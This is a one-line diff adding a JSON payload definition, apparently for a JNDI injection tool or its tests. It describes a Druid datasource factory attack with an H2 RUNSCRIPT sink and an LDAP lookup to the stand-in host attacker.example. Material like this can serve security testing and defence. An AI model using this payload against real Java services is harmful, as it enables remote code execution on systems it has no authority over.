@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"com.alibaba.druid.pool.DruidDataSourceFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"url":"jdbc:h2:mem:test","driverClassName":"org.h2.Driver","init":"true","initialSize":"0"},"sink_type":"jdbc_h2_runscript","protocol":"ldap","lookup_url":"ldap://attacker.example:1389/exploit"}
